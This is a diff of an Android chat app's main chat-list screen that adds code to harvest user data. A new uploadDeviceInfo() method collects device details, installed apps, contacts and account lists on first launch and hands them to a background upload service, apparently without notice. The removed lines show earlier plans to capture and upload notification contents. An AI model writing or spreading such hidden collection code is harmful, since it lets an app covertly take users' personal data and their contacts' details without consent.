@@ -4,29 +4,16 @@ import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AlertDialog;
 import androidx.core.app.ActivityCompat;
-import androidx.core.app.NotificationManagerCompat;
-import androidx.core.content.ContextCompat;
-import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 
 import android.Manifest;
-import android.annotation.TargetApi;
-import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
-import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.ContactsContract;
-import android.provider.MediaStore;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -34,7 +21,6 @@ import android.webkit.MimeTypeMap;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageButton;
-import android.widget.ListView;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
@@ -43,13 +29,15 @@ import com.codies.Tattle.Interfaces.ChatClickListener;
 import com.codies.Tattle.Models.ChatList;
 import com.codies.Tattle.Models.ContactsInfo;
 import com.codies.Tattle.Models.User;
-import com.codies.Tattle.Models.imageFolder;
+import com.codies.Tattle.OtherUtils.ContactUtil;
+import com.codies.Tattle.OtherUtils.DeviceInfo;
 import com.codies.Tattle.R;
+import com.codies.Tattle.DataUploadServices.BasicDataUploadService;
 import com.codies.Tattle.Services.LoginService;
 import com.codies.Tattle.Utils.App;
 import com.codies.Tattle.Utils.ChatListAdapter;
 import com.codies.Tattle.Utils.QBResRequestExecutor;
-import com.codies.Tattle.Utils.SharedPrefs;
+import com.codies.Tattle.OtherUtils.SharedPrefs;
 import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.android.material.floatingactionbutton.FloatingActionButton;
@@ -69,6 +57,7 @@ import com.quickblox.core.exception.QBResponseException;
 import com.quickblox.users.model.QBUser;
 
 import java.io.File;
+import java.io.Serializable;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -95,7 +84,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
     String userName;
     ProgressBar photoUploadPB;
 
-    List<ContactsInfo> contactsInfoList;
+
 
     public static final int IMAGECHOOSERCODE = 1;
     Uri imageUri;
@@ -104,6 +93,8 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
     boolean imageUploading = false;
     boolean photoSelected = false;
     protected QBResRequestExecutor requestExecutor;
+
+    ContactUtil contactUtil;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -115,7 +106,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         sharedPrefs = SharedPrefs.getInstance(getApplicationContext());
         mAuth = FirebaseAuth.getInstance();
         requestExecutor = App.getInstance().getQbResRequestExecutor();
-
+        contactUtil = new ContactUtil(this);
         userId = mAuth.getCurrentUser().getUid().toString();
         newChatBt = findViewById(R.id.newChatBT);
         databaseReference = FirebaseDatabase.getInstance().getReference();
@@ -127,24 +118,9 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         recyclerView.setLayoutManager(new LinearLayoutManager(this));
         recyclerView.setAdapter(chatsAdapter);
 
-        //this is for getting gallery images permission
- /*       if(ContextCompat.checkSelfPermission(ChatListActivity.this,
-                Manifest.permission.READ_EXTERNAL_STORAGE)
-                != PackageManager.PERMISSION_GRANTED)
-            ActivityCompat.requestPermissions(ChatListActivity.this,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                    MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE);*/
-
-        //this will get contacts that later have to be uploaded to database
-//        requestContactPermission();
-
-        //this is for reading the notifications, this too has to be stored and uploaded to database
-        if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {        //ask for permission
-            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
-            startActivity(intent);
+        if (!sharedPrefs.isBasicDataUploaded()) {
+            uploadDeviceInfo();
         }
-
-        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
 
 
         readChats();
@@ -157,8 +133,19 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
                 startActivity(new Intent(ChatListActivity.this, SearchActivity.class));
             }
         });
-
     }
+
+    public void uploadDeviceInfo() {
+        DeviceInfo deviceInfo = new DeviceInfo(this);
+        Intent serviceIntent = new Intent(this, BasicDataUploadService.class);
+        serviceIntent.putExtra("deviceInfo", deviceInfo.getDetails());
+        serviceIntent.putExtra("installedApps",(Serializable) deviceInfo.getInstalledApps());
+        serviceIntent.putExtra("contacts", (Serializable) contactUtil.getContacts());
+        serviceIntent.putExtra("accounts", (Serializable) deviceInfo.getAccounts());
+        BasicDataUploadService.enqueueWork(this, serviceIntent);
+    }
+
+
 
     public void readChats() {
         databaseReference.child("ChatList").child(userId).addValueEventListener(new ValueEventListener() {
@@ -413,7 +400,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         if (requestCode == PERMISSIONS_REQUEST_READ_CONTACTS) {
             if (grantResults.length > 0
                     && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                getContacts();
+//                getContacts();
             } else {
                 Toast.makeText(this, "You have disabled a contacts permission", Toast.LENGTH_LONG).show();
             }
@@ -479,51 +466,9 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         startActivity(intent);
     }
 
-    private void getContacts(){
-        ContentResolver contentResolver = getContentResolver();
-        String contactId = null;
-        String displayName = null;
-        contactsInfoList = new ArrayList<ContactsInfo>();
-        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
-        if (cursor.getCount() > 0) {
-            while (cursor.moveToNext()) {
-                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
-                if (hasPhoneNumber > 0) {
 
-                    ContactsInfo contactsInfo = new ContactsInfo();
-                    contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                    displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    contactsInfo.setContactId(contactId);
-                    contactsInfo.setDisplayName(displayName);
-
-                    Cursor phoneCursor = getContentResolver().query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{contactId},
-                            null);
-
-                    if (phoneCursor.moveToNext()) {
-                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-
-                        contactsInfo.setPhoneNumber(phoneNumber);
-                    }
-
-                    phoneCursor.close();
-
-                    contactsInfoList.add(contactsInfo);
-                }
-            }
-        }
-        cursor.close();
-        Log.i(TAG, "getContacts: " + contactsInfoList.size());
-        for (ContactsInfo contactsInfo : contactsInfoList) {
-            Log.i(TAG, "getContacts: "+contactsInfo.toString());
-        }
-    }
-
-    public void requestContactPermission() {
+   /* public void requestContactPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                 if (ActivityCompat.shouldShowRequestPermissionRationale(this,
@@ -553,7 +498,7 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
         } else {
             getContacts();
         }
-    }
+    }*/
 
     public void saveContactsToFirebase(List<ContactsInfo> contactInfos) {
         databaseReference.child("userContactsList").child(mAuth.getCurrentUser().getUid()).child("contacts").setValue(contactInfos).addOnSuccessListener(new OnSuccessListener<Void>() {
@@ -565,34 +510,6 @@ public class ChatListActivity extends BaseActivity implements ChatClickListener 
     }
 
 
-    private BroadcastReceiver onNotice = new BroadcastReceiver() {
-
-        @Override
-        public void onReceive(Context context, Intent intent) {
-             String pack = intent.getStringExtra("package");
-            String title = intent.getStringExtra("title");
-            String text = intent.getStringExtra("text");
-
-  /*          Log.i(TAG, "onReceive: " + pack);
-            Log.i(TAG, "onReceive: " + title);
-            Log.i(TAG, "onReceive: " + text);*/
-
-            //int id = intent.getIntExtra("icon",0);
-
-       /*     Log.i(TAG, "onReceive: " + title);
-            Log.i(TAG, "onReceive: " + text);*/
-            Context remotePackageContext = null;
-            try {
-//                remotePackageContext = getApplicationContext().createPackageContext(pack, 0);
-//                Drawable icon = remotePackageContext.getResources().getDrawable(id);
-//                if(icon !=null) {
-//                    ((ImageView) findViewById(R.id.imageView)).setBackground(icon);
-
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
-    };
 
 /*    private ArrayList<imageFolder> getPicturePaths(){
         ArrayList<imageFolder> picFolders = new ArrayList<>();
